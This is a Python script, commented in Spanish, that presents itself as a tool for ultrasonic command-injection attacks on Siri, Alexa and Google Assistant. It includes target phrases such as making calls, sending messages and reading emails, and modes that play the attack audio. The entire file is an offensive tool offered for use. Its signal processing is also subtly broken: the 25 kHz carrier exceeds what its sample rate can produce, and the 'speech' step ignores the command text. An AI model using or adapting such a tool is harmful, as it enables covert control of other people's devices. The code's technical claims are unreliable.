#!/usr/bin/env python3
"""
ASSISTANT ATTACK - Ataques ultrasónicos a asistentes virtuales
Basado en SurfingAttack y DolphinAttack
Implementa modulación de voz ultrasónica para inyectar comandos a Siri, Alexa, Google Assistant
"""

import numpy as np
import sounddevice as sd
import scipy.signal as signal
from scipy.io import wavfile
import time
import argparse
import json
import os

class AssistantAttack:
    """Sistema de ataque ultrasónico a asistentes virtuales"""
    
    def __init__(self):
        # Configuración de audio
        self.sample_rate = 44100
        self.amplitude = 0.8
        
        # Frecuencias de modulación (basadas en DolphinAttack)
        self.carrier_freq = 25000  # Hz - Frecuencia portadora ultrasónica
        self.modulation_freq = 2000  # Hz - Frecuencia de modulación
        
        # Comandos específicos por asistente
        self.commands = {
            'siri': {
                'activate': 'Hey Siri',
                'call': 'Call emergency',
                'open_app': 'Open Safari',
                'send_message': 'Send message to Mom',
                'play_music': 'Play music',
                'set_alarm': 'Set alarm for 5 minutes',
                'take_photo': 'Take a photo',
                'read_emails': 'Read my emails'
            },
            'alexa': {
                'activate': 'Alexa',
                'play_music': 'Play music',
                'weather': 'What\'s the weather like',
                'news': 'Tell me the news',
                'timer': 'Set a timer for 5 minutes',
                'shopping': 'Add milk to shopping list',
                'smart_home': 'Turn on the lights',
                'joke': 'Tell me a joke'
            },
            'google': {
                'activate': 'Hey Google',
                'search': 'Search for restaurants nearby',
                'navigate': 'Navigate to home',
                'translate': 'Translate hello to Spanish',
                'calculator': 'What is 15 times 23',
                'reminder': 'Remind me to call mom tomorrow',
                'play_music': 'Play some music',
                'weather': 'What\'s the weather today'
            }
        }
        
        # Configuración de modulación
        self.modulation_config = {
            'demodulation_freq': 2000,  # Hz - Frecuencia de demodulación
            'filter_cutoff': 8000,      # Hz - Corte del filtro pasa-bajo
            'envelope_smoothing': 0.01   # Suavizado del envolvente
        }
    
    def create_ultrasonic_modulation(self, voice_audio, duration=None):
        """Crea modulación ultrasónica de la voz (técnica DolphinAttack)"""
        if duration:
            # Recortar o extender la voz a la duración deseada
            target_samples = int(duration * self.sample_rate)
            if len(voice_audio) > target_samples:
                voice_audio = voice_audio[:target_samples]
            else:
                # Extender con silencio
                padding = np.zeros(target_samples - len(voice_audio))
                voice_audio = np.concatenate([voice_audio, padding])
        
        # Normalizar la voz
        voice_audio = voice_audio / np.max(np.abs(voice_audio)) * 0.3
        
        # Crear señal portadora ultrasónica
        t = np.linspace(0, len(voice_audio) / self.sample_rate, len(voice_audio))
        carrier = np.sin(2 * np.pi * self.carrier_freq * t)
        
        # Modulación AM (Amplitude Modulation) - técnica clave de DolphinAttack
        modulated = carrier * (1 + voice_audio)
        
        # Aplicar filtro pasa-alto para eliminar componentes de baja frecuencia
        b, a = signal.butter(4, 20000 / (self.sample_rate / 2), btype='high')
        filtered = signal.filtfilt(b, a, modulated)
        
        return filtered
    
    def create_demodulation_signal(self, voice_audio):
        """Crea señal de demodulación para recuperar la voz"""
        t = np.linspace(0, len(voice_audio) / self.sample_rate, len(voice_audio))
        
        # Señal de demodulación
        demod_signal = np.sin(2 * np.pi * self.modulation_config['demodulation_freq'] * t)
        
        # Multiplicar con la señal modulada para demodular
        demodulated = voice_audio * demod_signal
        
        # Filtro pasa-bajo para recuperar la señal original
        b, a = signal.butter(4, self.modulation_config['filter_cutoff'] / (self.sample_rate / 2), btype='low')
        recovered = signal.filtfilt(b, a, demodulated)
        
        return recovered
    
    def text_to_speech_attack(self, text, assistant='siri', duration=2.0):
        """Convierte texto a voz y crea ataque ultrasónico"""
        print(f"[INFO] Preparando ataque para {assistant.upper()}")
        print(f"[INFO] Comando: '{text}'")
        print(f"[INFO] Duración: {duration}s")
        
        # Por ahora usamos síntesis simple (en producción usaría TTS real)
        # Frecuencias de voz humana (85-255 Hz para voces masculinas, 165-255 Hz para femeninas)
        voice_freq = 200  # Hz - frecuencia base de voz
        
        # Crear tono de voz sintético
        t = np.linspace(0, duration, int(self.sample_rate * duration))
        
        # Simular voz con múltiples armónicos
        voice_signal = np.zeros_like(t)
        harmonics = [1, 2, 3, 4, 5]  # Armónicos de la voz
        
        for i, harmonic in enumerate(harmonics):
            amplitude = 0.3 / harmonic  # Amplitud decrece con armónicos
            voice_signal += amplitude * np.sin(2 * np.pi * voice_freq * harmonic * t)
        
        # Aplicar envolvente de voz (ataque, sostenido, decaimiento)
        envelope = np.ones_like(t)
        attack_time = 0.1  # 100ms
        decay_time = 0.2   # 200ms
        
        attack_samples = int(attack_time * self.sample_rate)
        decay_samples = int(decay_time * self.sample_rate)
        
        # Ataque
        envelope[:attack_samples] = np.linspace(0, 1, attack_samples)
        # Decaimiento
        envelope[-decay_samples:] = np.linspace(1, 0, decay_samples)
        
        voice_signal *= envelope
        
        # Crear modulación ultrasónica
        ultrasonic_attack = self.create_ultrasonic_modulation(voice_signal, duration)
        
        return ultrasonic_attack
    
    def play_attack(self, audio_signal, description=""):
        """Reproduce el ataque ultrasónico"""
        print(f"[INFO] Reproduciendo ataque ultrasónico... {description}")
        print(f"[INFO] Frecuencia portadora: {self.carrier_freq} Hz")
        print(f"[INFO] Amplitud: {self.amplitude}")
        
        # Normalizar y aplicar amplitud
        audio_signal = audio_signal / np.max(np.abs(audio_signal)) * self.amplitude
        
        # Reproducir
        sd.play(audio_signal, self.sample_rate)
        sd.wait()
        
        print("[INFO] Ataque completado")
    
    def test_assistant_commands(self, assistant='siri'):
        """Prueba comandos específicos para un asistente"""
        if assistant not in self.commands:
            print(f"[ERROR] Asistente '{assistant}' no soportado")
            return
        
        print(f"\n[TEST] Probando comandos para {assistant.upper()}")
        print("=" * 50)
        
        for command_name, command_text in self.commands[assistant].items():
            print(f"\n[TEST] Comando: {command_name}")
            print(f"[TEST] Texto: '{command_text}'")
            
            # Crear ataque
            attack_audio = self.text_to_speech_attack(command_text, assistant, duration=1.5)
            
            # Preguntar si reproducir
            response = input(f"¿Reproducir ataque '{command_name}'? (s/n): ").strip().lower()
            if response == 's':
                self.play_attack(attack_audio, f"Comando: {command_name}")
            else:
                print("[SKIP] Saltando comando")
    
    def interactive_mode(self):
        """Modo interactivo para pruebas"""
        print("\n" + "="*60)
        print("ASSISTANT ATTACK - MODO INTERACTIVO")
        print("="*60)
        
        while True:
            print("\nOpciones:")
            print("[1] Probar comandos Siri")
            print("[2] Probar comandos Alexa") 
            print("[3] Probar comandos Google Assistant")
            print("[4] Comando personalizado")
            print("[5] Salir")
            
            choice = input("\nSelecciona: ").strip()
            
            if choice == "1":
                self.test_assistant_commands('siri')
            elif choice == "2":
                self.test_assistant_commands('alexa')
            elif choice == "3":
                self.test_assistant_commands('google')
            elif choice == "4":
                text = input("Texto del comando: ").strip()
                if text:
                    assistant = input("Asistente (siri/alexa/google): ").strip().lower()
                    if assistant in self.commands:
                        attack_audio = self.text_to_speech_attack(text, assistant, duration=2.0)
                        self.play_attack(attack_audio, f"Comando personalizado: {text}")
                    else:
                        print("[ERROR] Asistente no válido")
            elif choice == "5":
                break
            else:
                print("[ERROR] Opción inválida")

def main():
    """Función principal"""
    parser = argparse.ArgumentParser(description="Ataques ultrasónicos a asistentes virtuales")
    parser.add_argument('--assistant', choices=['siri', 'alexa', 'google'], 
                       help='Asistente objetivo')
    parser.add_argument('--command', type=str, help='Comando específico a ejecutar')
    parser.add_argument('--interactive', action='store_true', help='Modo interactivo')
    
    args = parser.parse_args()
    
    attack = AssistantAttack()
    
    if args.interactive:
        attack.interactive_mode()
    elif args.assistant and args.command:
        attack_audio = attack.text_to_speech_attack(args.command, args.assistant)
        attack.play_attack(attack_audio, f"Comando: {args.command}")
    else:
        print("[INFO] Usando modo interactivo por defecto")
        attack.interactive_mode()

if __name__ == "__main__":
    main() 